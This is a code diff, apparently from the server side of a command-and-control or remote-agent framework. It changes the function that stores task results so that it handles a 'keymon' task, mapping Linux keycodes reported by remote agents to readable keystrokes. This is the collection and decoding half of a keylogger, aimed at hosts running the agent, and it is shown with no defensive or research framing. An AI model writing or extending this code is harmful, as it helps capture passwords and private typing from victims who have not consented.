@@ -195,23 +195,117 @@ export const markReceived = async (taskID) => {
 
 /**
  * Set the result of a task and mark it as complete. Emits the "update_task" event on success.
- * @param {string} taskID - The ID of the task.
- * @param {string} result - The result of the task.
+ * @param {string} agentID - The ID of the agent.
+ * @param {object} result - The result data.
  */
-export const setResult = async (taskID, result) => {
+export const setResult = async (agentID, data) => {
 
+  agentID = agentID.toString();
+  let taskID = data.uid.toString();
+  let result = data.result;
   if (!result)
     result = "";
+  result = result.toString();
   const socketServer = global.socketServer;
+  const agent = await getAgent(agentID);
   const task = await Task.findOne({uid: taskID.toString()});
   if (!(task && task.completed === false))
     throw new Error("Invalid task!");
   task.completed = true;
   task.dateCompleted = Date.now();
-  // Cleanup trailing newlines.
-  result = result.toString().replace(/\r\n+$/, "");
-  result = result.replace(/\n+$/, "");
-  task.result = result;
+  if (task.taskType === "keymon"){
+    task.result = "Keymon: ";
+    let keys = data.loggedKeys;
+    if (keys){
+      if (agent.os === "linux"){
+        // const mapping = ["??", "[ESC]", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "[BACKSAPCE]", "[TAB]", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "[ENTER]", "[L-CTRL]", "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "[L-SHIFT]", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "[R-SHIFT]", "*", "??", "[L-ALT]", "[SPACE]", "[CAPSLOCK]", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "[NUM-LOCK]", "[SCROLL-LOCK]", ""];
+        let mapping = {};
+        mapping[1] = "[ESC]";
+        for (let i = 2; i < 11; i++)
+          mapping[i] = `${i - 1}`;
+        mapping[11] = "0";
+        mapping[12] = "-";
+        mapping[13] = "=";
+        mapping[14] = "[BACKSPACE]";
+        mapping[15] = "[TAB]";
+        mapping[16] = "q";
+        mapping[17] = "w";
+        mapping[18] = "e";
+        mapping[19] = "r";
+        mapping[20] = "t";
+        mapping[21] = "y";
+        mapping[22] = "u";
+        mapping[23] = "i";
+        mapping[24] = "o";
+        mapping[25] = "p";
+        mapping[26] = "[";
+        mapping[27] = "]";
+        mapping[28] = "[ENTER]";
+        mapping[29] = "[L-CTRL]";
+        mapping[30] = "a";
+        mapping[31] = "s";
+        mapping[32] = "d";
+        mapping[33] = "f";
+        mapping[34] = "g";
+        mapping[35] = "h";
+        mapping[36] = "j";
+        mapping[37] = "k";
+        mapping[38] = "l";
+        mapping[39] = ";";
+        mapping[40] = "'";
+        mapping[41] = "`";
+        mapping[42] = "[L-SHIFT]";
+        mapping[43] = "\\";
+        mapping[44] = "z";
+        mapping[45] = "x";
+        mapping[46] = "c";
+        mapping[47] = "v";
+        mapping[48] = "b";
+        mapping[49] = "n";
+        mapping[50] = "m";
+        mapping[51] = ",";
+        mapping[52] = ".";
+        mapping[53] = "/";
+        mapping[54] = "[R-SHIFT]";
+        mapping[56] = "[L-ALT]";
+        mapping[57] = "[SPACE]";
+        mapping[58] = "[CAPSLOCK]";
+        for (let i = 59; i < 69; i++)
+          mapping[i] = `F${i - 58}`;
+        mapping[69] = "[NUM-LOCK]";
+        mapping[70] = "[SCROLL-LOCK]";
+        mapping[87] = "F11";
+        mapping[88] = "F12";
+        mapping[100] = "[R-ALT]";
+        mapping[101] = "[LINEFEED]";
+        mapping[102] = "[HOME]";
+        mapping[103] = "[UP]";
+        mapping[104] = "[PG-UP]";
+        mapping[105] = "[LEFT]";
+        mapping[106] = "[RIGHT]";
+        mapping[107] = "[END]";
+        mapping[108] = "[DOWN]";
+        mapping[109] = "[PG-DOWN]";
+        mapping[110] = "[INSERT]";
+        for (let i = 0; i < keys.length; i++){
+          let val = mapping[parseInt(keys[i])];
+          if (!val)
+            val = keys[i].toString();
+          task.result += `${val} `;
+        }        
+      }else{        
+        for (let i = 0; i < keys.length; i++)
+          task.result += `${keys[i]} `;
+      }
+    }else{
+      task.result = result;
+    }
+  }else{  
+    // Cleanup trailing newlines.
+    result = result.toString().replace(/\r\n+$/, "");
+    result = result.replace(/\n+$/, "");
+    task.result = result;
+  }
   await task.save();
   socketServer.emit("update_task", task);
   let message = global.serverPrompt + `Task '${task.uid}' (${task.taskType}) completed`
